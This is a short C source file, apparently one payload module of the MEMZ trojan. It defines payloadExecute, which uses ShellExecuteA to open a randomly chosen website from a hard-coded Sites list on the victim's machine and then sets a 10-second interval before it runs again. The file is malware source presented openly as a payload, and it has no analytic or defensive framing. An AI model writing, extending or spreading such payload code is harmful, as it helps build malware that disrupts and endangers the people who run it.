#include "../MEMZ.h"

PAYLOADFUNCTIONDEFAULT(payloadExecute) {
	PAYLOADHEAD

	ShellExecuteA(NULL, "open", (LPCSTR)Sites[random() % SitesLen], NULL, NULL, SW_SHOWDEFAULT);

	out: return 10000.0;
}